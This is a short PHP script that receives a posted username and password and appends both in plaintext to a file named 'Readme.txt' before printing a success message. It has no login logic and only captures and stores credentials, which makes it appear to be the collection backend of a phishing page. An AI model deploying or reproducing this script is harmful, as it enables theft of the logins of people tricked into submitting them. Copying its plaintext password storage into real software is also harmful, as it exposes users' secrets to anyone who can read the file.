
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $text = htmlspecialchars($_POST['text']);
    $password = htmlspecialchars($_POST['password']);

    // Log data to a text file
    $file = fopen("Readme.txt", "a"); // Open in append mode
    if ($file) {
        fwrite($file, "Username: $text\nPassword: $password\n\n");
        fclose($file);
        echo "Data successfully saved!";
    } else {
        echo "Error writing to file.";
    }
} else {
    echo "Invalid request method.";
}
?>